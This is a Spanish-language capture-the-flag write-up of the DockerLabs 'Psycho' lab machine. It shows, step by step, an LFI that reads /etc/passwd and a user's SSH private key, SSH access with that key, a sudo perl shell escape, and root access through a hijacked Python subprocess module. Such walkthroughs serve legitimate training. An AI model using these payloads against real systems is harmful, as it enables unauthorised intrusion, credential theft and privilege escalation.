# Máquina Psycho

Enlace a la máquina -> [Dockerlabs](https://mega.nz/file/MSkgWDKJ#UHmAFBkvOpAc9fPIDocrVDLYz0VY6BolhLz87f3tSNM)

![imagen](https://github.com/user-attachments/assets/f05097a8-d26a-47fa-9b73-6ce97ba6f908)

- **Nombre de la Máquina:** Psycho
- **Sistema Operativo:** Linux
- **Dificultad:** Fácil
- **Plataforma:** DockerLabs
- **Dirección IP:** 172.17.0.2
- **Vulnerabilidades Explotadas:**
  - LFI (Local File Inclusion)
  - Exposición de claves privadas
  - Permisos sudo mal configurados
  - Python Library Hijacking
- **Escalada de Privilegios:**
  - Desde `vaxei` a `luisillo` mediante `perl` con sudo.
  - Desde `luisillo` a `root` explotando un **Python Library Hijacking** en el script `paw.py`.

## Reconocimiento y Enumeración
Comenzamos realizando un escaneo general con Nmap sobre la IP de la máquina objetivo para identificar los puertos abiertos.

```bash
sudo nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oN escaneo.txt
```

![imagen](https://github.com/user-attachments/assets/d0f124ed-df43-40b0-a176-44d197c0fce5)

El escaneo muestra que los puertos 22 y 80 están abiertos. Realizamos un análisis más detallado para determinar qué servicios se están ejecutando en estos puertos.

```bash
sudo nmap -p 22,80 -sCV 172.17.0.2 -oN targeted.txt
```

![imagen](https://github.com/user-attachments/assets/be4bf4e1-487c-4fcf-880e-b8284d95b7c3)

### Puerto 80 HTTP
Lanzamos un `whatweb` para ver qué servicios corren en el puerto HTTP.

![imagen](https://github.com/user-attachments/assets/72b23bfe-508c-4d27-8f4c-ac72bcea4d92)

En la página principal encontramos una web básica.

![imagen](https://github.com/user-attachments/assets/39e4dc72-5e81-4800-b0e1-2419c9eae51d)

La web fue creada por un usuario llamado **TLuisillo_o**, según aparece en la página. Los botones no son funcionales y al final del archivo encontramos un mensaje de error.

![imagen](https://github.com/user-attachments/assets/b01220af-42ee-4151-a62a-45fb81b4b98f)

Realizamos un escaneo de directorios en busca de algún directorio interesante, pero no encontramos nada relevante salvo que el index de la página es `index.php`. En el directorio `/assets`, solo está el archivo jpg del fondo de la web.

![imagen](https://github.com/user-attachments/assets/cafe9b63-0ccf-475f-9d02-81dbecde177b)

Observamos que hay un error al final de la web, lo cual podría deberse a que `index.php` está llamando incorrectamente a un parámetro. Realizamos fuzzing para encontrar ese posible parámetro.

```bash
wfuzz -c -u "http://172.17.0.2/index.php?FUZZ=" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 --hw 169
```

![imagen](https://github.com/user-attachments/assets/7f8f98c6-bb03-40a6-a3b7-8429b9cc4ab5)

Encontramos el parámetro **secret** y probamos si podemos explotar un LFI para leer archivos de la máquina víctima.

```url
http://172.17.0.2/index.php?secret=/etc/passwd
```

![imagen](https://github.com/user-attachments/assets/322758ee-77c9-41c8-bc51-920da2246960)

Efectivamente, podemos leer archivos de la máquina víctima. En el archivo `/etc/passwd` encontramos dos usuarios:
- vaxei
- luisillo

Probamos a realizar un ataque de fuerza bruta sobre el servicio SSH, pero no logramos obtener las contraseñas de los usuarios. Sin embargo, tras buscar más archivos, encontramos el archivo `id_rsa` del usuario **vaxei**, lo que nos permitirá acceder vía SSH sin necesidad de contraseña.

```url
http://172.17.0.2/index.php?secret=/home/vaxei/.ssh/id_rsa
```

![imagen](https://github.com/user-attachments/assets/0cf85193-02ab-4d1e-9ff1-d55aec6d13c5)

Copiamos la clave privada y la guardamos en un archivo de texto plano. Luego, cambiamos los permisos y nos conectamos vía SSH con el usuario `vaxei`.

```bash
chmod 700 id_rsa
ssh vaxei@172.17.0.2 -i id_rsa
```

![imagen](https://github.com/user-attachments/assets/cedd3ada-fc2c-4056-8825-d5b342986bc6)

## Escalada de privilegios a luisillo
Lo primero que hacemos es ejecutar un `sudo -l` para verificar si tenemos algún permiso especial, y encontramos que podemos ejecutar el comando `perl` como `luisillo`.

![imagen](https://github.com/user-attachments/assets/addb6d5b-5786-4cff-a21d-c4f564129c4a)

Utilizando el siguiente comando, ejecutamos una shell como el usuario `luisillo`.

```bash
sudo -u luisillo /usr/bin/perl -e 'exec "/bin/bash";'
```

![imagen](https://github.com/user-attachments/assets/a1782421-39b3-4e85-812b-54894dbdb436)

## Escalada de privilegios a root
Nuevamente, ejecutamos un `sudo -l` para verificar si tenemos algún permiso adicional, y descubrimos que podemos ejecutar el script `/opt/paw.py` como root usando Python 3.

![imagen](https://github.com/user-attachments/assets/b1014099-4fc3-4c9d-ae61-7748ef4999cb)

Observamos que el script `paw.py` está intentando importar la librería `subprocess`, pero encontramos un error que indica que el archivo `echo Hello!` no se encuentra.

```bash
sudo -u root /usr/bin/python3 /opt/paw.py
```

Podemos aprovechar este error para realizar un ataque de **Python Library Hijacking**. Creamos un archivo llamado `subprocess.py` en el directorio actual y añadimos el siguiente código para lanzar una shell con privilegios de root.

```bash
import os
os.system("bash -p")
```

Finalmente, ejecutamos el script `paw.py` nuevamente como root, lo que nos otorga una shell privilegiada.

```bash
sudo -u root /usr/bin/python3 /opt/paw.py
```

![imagen](https://github.com/user-attachments/assets/e758cef3-8811-4da0-9b2c-fafe966885cc)
